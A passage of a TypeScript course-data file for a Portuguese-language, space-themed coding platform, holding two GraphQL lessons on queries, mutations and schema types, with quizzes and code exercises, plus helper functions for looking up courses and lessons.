Bem-vindo à **Matriz Conectiva**, a central de transmissão de dados do Nexus!

Em 2012, quando os engenheiros do Facebook estavam migrando seus aplicativos móveis para redes celulares lentas, eles enfrentaram dois problemas graves com a arquitetura REST tradicional:

1. **Over-fetching:** O endpoint \`/api/usuarios/1\` devolvia 40 campos com dados pesados quando o aplicativo móvel precisava apenas do \`nome\` e da foto de \`avatar\`.
2. **Under-fetching:** Para montar uma tela de perfil com as missões e medalhas, o frontend precisava disparar 3 ou 4 requisições HTTP em cascata (\`/usuarios/1\`, depois \`/missoes\`, depois \`/medalhas\`).

Para resolver isso de forma definitiva, eles criaram o **GraphQL**!

---

### 🎯 A Filosofia do GraphQL: O Cliente no Controle

Com GraphQL, a API possui um **único endpoint** (geralmente \`/graphql\`). O cliente envia uma consulta no formato de documento e recebe exatamente o formato JSON correspondente:

\`\`\`graphql
# Consulta enviada pelo frontend:
query ObterCadete {
  cadete(id: "101") {
    nome
    nivel
    xp
  }
}
\`\`\`

O servidor responde com precisão milimétrica:
\`\`\`json
{
  "data": {
    "cadete": {
      "nome": "Neo",
      "nivel": 15,
      "xp": 8500
    }
  }
}
\`\`\`

---

### 🕸️ Conectando Relacionamentos em Uma Única Viagem

Se você precisar dos dados do cadete e de todas as missões ativas dele:

\`\`\`graphql
query PerfilCompleto {
  cadete(id: "101") {
    nome
    missoes {
      titulo
      recompensaXp
    }
  }
}
\`\`\`
Tudo é resolvido e entregue em **uma única requisição HTTP**!

> **💡 Dica Pro:**
> Como o cliente sempre define o que quer receber, o backend pode adicionar novos campos no schema ao longo dos anos sem quebrar versões antigas de aplicativos móveis em circulação!

> **⚠️ Armadilha Comum:**
> Em GraphQL, as respostas de sucesso ou erro sempre retornam o código HTTP \`200 OK\`. Para verificar se houve falhas, o cliente inspeciona se o JSON contém a chave \`errors\`.`,
        codeExample: `# Exemplo de Query GraphQL com Variáveis
query BuscarNavePorCodigo($codigo: ID!) {
  nave(codigo: $codigo) {
    id
    modelo
    capacidade
    status
  }
}`,
        exercises: [
          {
            type: 'quiz',
            question: 'O que é "Over-fetching" nas APIs REST tradicionais e como o GraphQL soluciona esse problema?',
            options: [
              'É quando o servidor cai por excesso de tráfego; o GraphQL adiciona mais memória RAM ao servidor.',
              'É quando a API devolve muito mais campos e dados do que a interface realmente precisa; o GraphQL resolve permitindo que o cliente especifique os campos exatos.',
              'É quando o cliente faz uma requisição para a porta errada do roteador.',
              'É uma técnica avançada de compressão de imagens PNG.'
            ],
            correctIndex: 1,
            explanation: 'O GraphQL elimina o over-fetching porque o cliente descreve na query a forma exata dos dados que necessita, economizando banda de rede e processamento móvel.'
          },
          {
            type: 'fillblank',
            title: 'Estruturando a Query de Tripulantes',
            instruction: 'Complete a palavra-chave padrão de leitura do GraphQL.',
            codeSnippet: `{{tipo_operacao}} ListarOficiais {
  oficiais {
    id
    nome
  }
}`,
            blanks: [
              {
                id: 'tipo_operacao',
                placeholder: 'tipo de operação',
                expectedValues: ['query'],
                hint: 'Palavra em inglês usada para operações de busca e leitura no GraphQL.'
              }
            ],
            explanation: 'Perfeito! query é o tipo raiz do GraphQL para operações de consulta seguras e sem efeito colateral.'
          }
        ]
      },
      {
        id: 'graphql-2',
        title: '2. Modificando o Cosmos: Mutations & Schemas Tipados',
        description: 'Crie e altere dados com Mutations atômicas e aprenda o Schema Definition Language (SDL).',
        duration: 16,
        xpReward: 65,
        language: 'graphql',
        content: `# ⚡ Mutations & Schemas Tipados no GraphQL

Se as **Queries** são usadas para buscar dados (equivalente ao \`GET\` do REST), como fazemos para criar, alterar ou deletar registros?

No GraphQL, todas as operações que causam alterações ou efeitos colaterais no servidor são chamadas de **Mutations**!

---

### ✍️ A Anatomia de uma Mutation

Uma \`mutation\` recebe parâmetros e já permite solicitar os dados resultantes na mesma requisição:

\`\`\`graphql
mutation CriarNovoCadete($nome: String!, $nivelInicial: Int!) {
  cadastrarCadete(nome: $nome, nivel: $nivelInicial) {
    id
    nome
    criadoEm
  }
}
\`\`\`

---

### 📜 Schema Definition Language (SDL)

Toda API GraphQL possui um contrato rígido chamado **Schema**. Nele definimos os tipos:

\`\`\`graphql
type Cadete {
  id: ID!
  nome: String!
  nivel: Int!
  ativo: Boolean
}

type Query {
  obterCadete(id: ID!): Cadete
}

type Mutation {
  cadastrarCadete(nome: String!, nivel: Int!): Cadete
}
\`\`\`

### ❗ O Modificador \`!\` (Non-Null / Obrigatório)

- \`String\`: Pode retornar um texto OU o valor \`null\`.
- \`String!\`: É **estritamente obrigatório**. O servidor garante que nunca será retornado \`null\`.

> **💡 Dica Pro:**
> O tipo escalar nativo \`ID\` sinaliza para ferramentas e clientes como Apollo Client ou Relay que aquele campo é uma chave única ideal para normalização e atualização automática de cache na tela!

> **⚠️ Armadilha Comum:**
> Esquecer de declarar as variáveis na assinatura da mutation (ex: esquecer \`$nome: String!\`) gera erro de validação de sintaxe antes da execução.`,
        codeExample: `# Schema Completo de Missões da Frota
type Missao {
  id: ID!
  titulo: String!
  recompensaXp: Int!
  concluida: Boolean!
}

type Mutation {
  concluirMissao(missaoId: ID!): Missao!
}`,
        exercises: [
          {
            type: 'quiz',
            question: 'No Schema Definition Language (SDL) do GraphQL, o que significa o ponto de exclamação (!) após o nome de um tipo (ex: String! ou ID!)?',
            options: [
              'Indica que o campo contém dados altamente confidenciais.',
              'Indica que o campo é obrigatório (Non-Null) e nunca poderá ter valor nulo.',
              'Indica que o campo só aceita letras maiúsculas.',
              'Indica que o campo será excluído na próxima versão da API.'
            ],
            correctIndex: 1,
            explanation: 'O ponto de exclamação marca o tipo como Non-Null (não-nulo), exigindo que os clientes forneçam o dado ou garantindo que o servidor sempre o devolverá preenchido.'
          },
          {
            type: 'code',
            instruction: 'Escreva uma mutation GraphQL chamada ConcluirTreinamento que recebe a variável $id: ID! e invoca concluir(id: $id) solicitando de volta os campos id e status.',
            initialCode: `# Escreva a mutation abaixo\n`,
            expectedKeywords: ['mutation ConcluirTreinamento($id: ID!)', 'concluir(id: $id)', 'id', 'status'],
            hint: 'Escreva: mutation ConcluirTreinamento($id: ID!) { concluir(id: $id) { id status } }.',
            solution: `mutation ConcluirTreinamento($id: ID!) {
  concluir(id: $id) {
    id
    status
  }
}`
          }
        ]
      }
    ]
  },
];

export function getCourseBySlug(slug: string): Course | undefined {
  return COURSES.find((c) => c.slug === slug);
}

export function getLessonById(courseSlug: string, lessonId: string) {
  const course = getCourseBySlug(courseSlug);
  if (!course) return null;
  const lesson = course.lessons.find((l) => l.id === lessonId);
  if (!lesson) return null;
  return { course, lesson };
}

export function getAllCourses() {
  return COURSES.map((course) => ({
    ...course,
    totalLessons: course.lessons.length,
  }));
}
